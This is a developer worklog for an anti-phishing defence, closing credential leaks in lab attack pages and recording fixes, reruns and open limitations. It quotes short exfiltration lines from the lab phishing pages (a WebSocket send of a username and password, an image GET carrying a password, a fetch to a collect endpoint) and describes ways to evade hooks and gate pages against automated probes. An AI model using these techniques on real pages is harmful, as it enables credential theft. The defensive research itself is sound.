# QuishGuard — Stage 12b leak-fix worklog

Running notes for closing the two leaks the Stage 12b comparison exposed
(`results/comparison.csv`, 2026-11-17): **CAPTCHA + WebSocket** and
**Linking-code lure** both reached the attacker despite QuishGuard being on.

Honest framing kept throughout: *detection* (page judged risky) stays separate
from *prevention* (send actually stopped); we say "blocks supported channels",
never "stops all data leaving". Android feasibility noted per change.

## Plan
1. Confirm both causes with a small test before changing anything.
2. Wire the sensor's **observed** sensitive values into the network guard
   (not harness-supplied secrets). Linking-code / one-time-code fields must
   count as sensitive.
3. Wrap `WebSocket.send` in `sensor.js` (hold-by-default like fetch). On a block
   verdict, close open sockets. Paper note: on Android, WebSocket can only be
   covered by the JS layer.
4. Add per-send logging of the stopping layer (sensor vs network) to
   `run_comparison.py`.
5. Rerun the full comparison. All 6 harmless pages must still pass; report any
   new false positives honestly.
6. While touching the CAPTCHA page: replace the one-click check with a
   distorted-code image the user types.

---

## Step 1 — Confirm the causes  ✅ (2026-11-17, static code evidence)

### Leak A — CAPTCHA + WebSocket
- `lab/attacks/captcha_ws_leak.html` exfiltrates over a WebSocket message:
  `new WebSocket("ws://127.0.0.1:8004")` → `ws.send("username=…&password=…")`.
- `src/quishguard/sensor.js` wraps **fetch, XMLHttpRequest, navigator.sendBeacon,
  form submit** — there is **no `WebSocket` wrapper**.
- The network-route guard uses `page.route("**/*")`; Playwright routing
  intercepts HTTP(S) requests, **not** WebSocket frames.
- ⇒ The send bypasses both layers. Implementation gap (missing channel coverage).

### Leak B — Linking-code lure
- `lab/attacks/link_scam_leak.html` field is `<input name="code"
  placeholder="8-digit linking code">` — plain text, not `type="password"`
  nor `autocomplete="one-time-code"`. It sends via `fetch(…:8002/collect)`.
- `sensor.js` SENSITIVE selector = `input[type="password"],
  input[autocomplete="one-time-code"]` → the `code` field is never observed,
  so `holding()` is false and the send is not held.
- `src/quishguard/sensitive.py::carries_sensitive(rec, typed_values)` matches the
  request against a list; in `run_comparison.py` that list is the harness value
  `[PASSWORD, OTP]`. `LINK-7788` was never in it ⇒ ALLOW.
- ⇒ Two stacked gaps: field not classed sensitive, and guard value list is
  harness-supplied rather than what the user actually typed. Implementation gap.

**Conclusion:** both are implementation gaps, not by-design limits. Proceeding to
the fixes.

---

## Step 2 — Observed sensitive values → network guard  ✅ (code)

- `guard.py`: added `Guard.observed: set[str]` (shared across layers). `decide()`
  now checks `carries_sensitive(rec, typed_values + sorted(observed))`.
- `sensor.py` (`judge_held_send`): pushes every observed typed value into
  `guard.observed`, so the network layer learns secrets from the page, not the
  harness.
- `sensor.js`: SENSITIVE selector broadened to also match linking-code /
  code-like fields: `input[name*="code" i], input[placeholder*="code" i]`
  (plus the existing password + one-time-code). The `code` field is now observed,
  so `holding()` fires and the fetch is held + judged.
- `run_comparison.py`: both guards now share one `observed` set; the network guard
  is given **no** harness secrets (previously `[PASSWORD, OTP]`).

Why link_scam now blocks: title "ChatLink - Shared album" off ChatLink's official
origin ⇒ impersonation +50, untrusted +20, cross-site (8003→8002) +30 = 100 ≥ 60.

## Step 3 — Wrap WebSocket.send in the sensor  ✅ (code)

- `sensor.js`: `window.WebSocket` replaced with a guarded wrapper. `ws.send` is
  hold-by-default (same as fetch): once something sensitive is typed, the message
  is judged; on a block verdict the socket is closed and the message never sends.
- **Android note (for the paper):** WebView's `shouldInterceptRequest` cannot see
  WebSocket frames, so on Android this channel can be covered **only** by the JS
  sensor layer — not the network layer. Noted in code too.

Why captcha_ws now blocks: title "Formosa Demo Bank - Secure sign-in" off its
official origin ⇒ 50 + 20 + 30 (8003→ws 8004) = 100 ≥ 60.

## Step 4 — Per-send stopping-layer logging  ✅ (code)

- `run_comparison.py`: `run_runtime` now returns `(leaks, blocked, stopping_layer)`
  where layer is `sensor` or `network`. New `stopped_by` column in the printed
  table and `results/comparison.csv`.

## Expected after rerun (to be confirmed by Step 5, not asserted)
- Harmless twins: all title "Bean Corner Cafe" (not a protected brand) and post
  **same-origin** to 8003 ⇒ score 20 < 60 ⇒ still allowed. Expect 0/6 false blocks.
- The two leaks should flip to BLOCK, stopped by the **sensor** layer (in-page),
  which matches the Android story: the JS layer is what covers WebSocket and
  page-transformed sends.

## Step 5 — Rerun  ⬜ (needs Chromium; run on Windows)
## Step 6 — CAPTCHA distorted-code image  ⬜ (SEQUENCING NOTE)
Doing step 6 now would make the automated victim unable to pass the CAPTCHA, so
the captcha_ws row would show "no leak" because the login never happens — masking
whether the WebSocket fix is what stopped it. Do step 6 AFTER step 5 confirms the
WS fix blocks, and give the distorted-code image a lab-readable hook so our victim
(simulating a human who can read the image) still drives it while a blind decoy
probe cannot.

---

## Step 5 rerun #1 — found a REGRESSION (2026-11-17)

Rerun table: the two targeted leaks now BLOCK (stopped by sensor), BUT two
previously-blocked attacks started leaking:

| Scenario | before | after step 2-4 |
|---|---|---|
| Pixel keylogger | BLOCK | **LEAK** |
| Hook evasion | BLOCK | **LEAK** |

**Cause:** removing the harness secrets `[PASSWORD, OTP]` from the network guard
stripped its value-matching backstop for channels the sensor does NOT wrap:
- Pixel keylogger exfiltrates via `new Image().src = ".../collect?k="+pw` (image GET).
- Hook evasion borrows a hidden iframe's clean `fetch` (the top-window hook is evaded).
Both were caught only because the network guard (page.route, which sees every
request in every frame) matched the harness-supplied password. With no secrets,
nothing matched.

**Fix (still "observed, not harness-supplied"):** new `window.__qg_observe`
exposed from `sensor.py`; `sensor.js` calls it on every input into a sensitive
field, so observed values reach Python at TYPE time (not only when a send is held).
The network guard regains its backstop from what the user actually typed. Capture-
phase listener runs before the page's own handlers, and Playwright delivers messages
in order, so `observed` is populated before the exfil request is routed.

Expected after fix: Pixel + Hook block again via the **network** layer
(stopped_by = network), while sensor-wrapped channels block via the sensor.

**Android caveat (honest):** on Android, `shouldInterceptRequest` sees the
destination/URL but CANNOT read POST bodies. So the pixel GET (data in URL) is
catchable by destination there, but hook-evasion (password in POST body, in an
evaded JS context) is NOT detectable on Android by value - only the JS sensor
could, and this attack is built to evade it. Flag this as a real open limitation
for RQ1, not something the lab's body-reading network guard papers over.

## Check 1 — narrow the sensitive-field selector  ✅
- Replaced the broad `name*="code"` CSS with `isSensitiveField()` in `sensor.js`:
  password / one-time-code always; a code/pin field only with a credential word
  (linking / verification / pairing / auth) or an OTP word.
- `tests/sensor_fields.test.mjs` (runs under node, mirrors the predicate):
  PASS - 7 sensitive classified sensitive; promo / postal / zip / country / discount
  classified harmless.
- New lab page `lab/attacks/promo_benign.html` (promo + postal + country-code,
  same-origin POST). The victim now types into these fields, and the harness reports
  `harmless pages HELD` so a false hold would show up, not just a false block.

## Check 2 — linking-code lure with NO protected brand  ✅ (honest limitation)
- New attack `lab/attacks/link_scam_nobrand_leak.html`: identical scam, title
  "Shared album" (no protected brand). Added to the comparison as
  "Linking-code (no brand)".
- Expected: sensor holds it (code field observed) and judges it, but score =
  untrusted 20 + cross-site 30 = **50 < 60** ⇒ ALLOWED ⇒ **LEAK**. This is a real
  limitation of the hand-tuned rules (no brand ⇒ no +50 impersonation). Report it,
  don't hide it. A URL/behaviour signal (not brand) would be needed to close it.

## Check 3 — minimum length on observed values  ✅
- `sensitive.py` already enforces `MIN_LENGTH = 4` in `carries_sensitive` (ignores
  values < 4 chars so "1"/"ab" can't match arbitrary URLs). Now also applied in
  `observe_values` so a 1-2 char field can't pollute the observed set at all.

## Step 5 rerun #2  ⬜ (needs Chromium; run on Windows) - verify:
- Pixel keylogger + Hook evasion back to BLOCK (likely stopped_by = network).
- Linking-code (no brand) = LEAK (documented limitation).
- Harmless: 0/7 blocked AND 0/7 held.

---

## Step 5 rerun #2 — regression fixed, leaks closed (2026-11-17)

| Scenario | No protection | Load-time | QuishGuard | stopped by |
|---|---|---|---|---|
| Early send | LEAK | catch | BLOCK | sensor |
| Pixel keylogger | LEAK | catch | BLOCK | sensor |
| Delayed form | LEAK | miss | BLOCK | sensor |
| CAPTCHA + WebSocket | LEAK | miss | BLOCK | sensor |
| Linking-code lure | LEAK | miss | BLOCK | sensor |
| Hook evasion | LEAK | catch | BLOCK | network |
| Linking-code (no brand) | LEAK | miss | **LEAK** | — |
| Harmless pages blocked | 0/7 | 0/7 | **0/7** | |

- Both targeted leaks closed; Pixel + Hook regression fixed (Hook now blocked by the
  **network** layer, consistent with the Android caveat above).
- Linking-code (no brand) LEAKs as predicted (score 50 < 60) — documented limitation.
- **0/7 false blocks.**

### On "harmless pages HELD: 4/7"
Holding ≠ blocking. The sensor holds every send once something genuinely sensitive
is typed, then judges and releases if safe. The 4 held pages are exactly the benign
twins with a real `password` / `one-time-code` field (beacon, pixel, captcha_ws,
iframe — otp_late also qualifies); they are held then ALLOWED (same-origin, score
20). That is the intended hold→judge→release flow, not a false positive.
The pages that must NOT be held are correctly excluded:
- `promo_benign` (promo / postal / country) — predicate excludes all three.
- `link_scam_benign` — field is "Share code": has "code" but no credential word.
Harness now prints the held pages BY NAME and a `WRONG holds` line (held pages with
no real sensitive field — must be empty). Confirm on the next rerun.

---

## Step 6 — distorted-code CAPTCHA with a lab-only hook  ✅ (code; rerun on Windows)

**Why:** the old CAPTCHA was a one-click "I'm not a robot" button, which any
automated sandbox (including a WHALE-style decoy-credential probe) passes trivially.
A real interaction-gated kit shows a challenge a bot cannot solve. We need our own
lab victim to still drive the page (to test the defence), without giving automated
probes a free pass - so the solving ability is a *lab-only hook*, not a weakness in
the page's logic.

**How the page works (`captcha_ws_leak.html`, and benign twin `captcha_ws_benign.html`):**
1. On load it generates a random 5-char `CODE` and draws it **distorted** to a
   `<canvas>` (rotated glyphs, random colours, noise lines) - not machine-readable
   without OCR.
2. The login form starts `display:none`. It is revealed ONLY when the typed code
   matches `CODE`; on success the gate element is removed from the DOM.
3. Only then can the login be filled and the credential sent (WebSocket for the
   attack page, same-origin fetch for the benign twin).

**The lab-only hook:**
- Each page sets `window.__LAB_CAPTCHA_CODE = CODE`, inside a block clearly marked
  `LAB-ONLY HOOK`. It stands in for a human reading the image.
- The solver `drive_captcha(page)` lives in the **lab harness** (`lab/run_comparison.py`):
  it reads `__LAB_CAPTCHA_CODE`, types it, clicks Verify. Registered in `SOLVERS`
  for the two captcha pages and passed to `visit_and_interact`.
- `src/quishguard/victim.py` gained only a GENERIC `solve=<callback>` hook-point; it
  contains no lab-specific code. **The hook is never in the sensor/guard** (sensor.js,
  guard.py, rules.py, sensitive.py are untouched by this step).

**Blind-victim test (`tests/test_captcha_gate.py`):** starts the attack server on an
ephemeral port and drives `captcha_ws_leak.html` two ways:
- hooked victim (reads `__LAB_CAPTCHA_CODE`) -> login form becomes visible -> PASS.
- blind victim (types "00000") -> wrong code -> login form stays hidden -> PASS
  (asserts it CANNOT reach the form, so no credential can be sent).
This is the evidence that the distorted-code gate stops a probe that merely fills
fields, while our instrumented victim still exercises the defence.

**Paper phrasing (honest):** the distorted-code CAPTCHA models an interaction-gated
kit. Our evaluation victim is given a lab-only oracle for the code so it can drive
the page; this is an evaluation affordance, not part of QuishGuard. A real
automated attacker without that oracle does not pass the gate (shown by the blind
test), which is exactly why interaction-gated pages defeat a bounded decoy probe
and motivate a runtime (not pre-release) defence.

### Rerun + test checklist (Windows)
    python lab\run_comparison.py          # CAPTCHA + WebSocket must stay BLOCK (sensor); 0/7 blocked
    pytest tests\test_captcha_gate.py     # 2 passed: hooked passes, blind cannot

### Correction after rerun (2026-11-17): keep the CAPTCHA load-time MISS
First step-6 rerun showed the CAPTCHA row's Load-time column as **catch** (was
**miss**). Cause: the redesigned page shipped the login `<form>` (password field)
in its HTML at load, so the load-time snapshot saw a sensitive field. That removes
the property this scenario exists to demonstrate - an interaction-gated page whose
sensitive content appears ONLY after the gate, which a pre-release/static check
misses. Fixed: the login form is now INJECTED into `#slot` only after the code is
verified (as the original one-click page did), so at load there is nothing
sensitive to flag. Expected after re-rerun: CAPTCHA Load-time = **miss** again,
QuishGuard = **BLOCK** (sensor). Blind-victim test unaffected (it checks the form
is revealed, which still only happens after a correct code).

---

## Addenda (2026-11-17)
- **Pixel/Hook regression, one line:** dropping the harness secrets `[PASSWORD, OTP]`
  from the network guard removed its value-matching backstop for channels the sensor
  does not wrap (pixel `Image().src` GET, hook-evasion's iframe clean `fetch`), so both
  leaked; fixed by `window.__qg_observe` feeding sensor-observed values to the network
  guard at type-time, so it matches on what the user actually typed.
- **Minimum length on observed values:** `MIN_LENGTH = 4` (sensitive.py) is enforced in
  both `carries_sensitive` and `observe_values`, so a 1-2 char value cannot match random
  requests or pollute the observed set. Unit test: `tests/test_observed_min_length.py`
  (4 cases, pass).
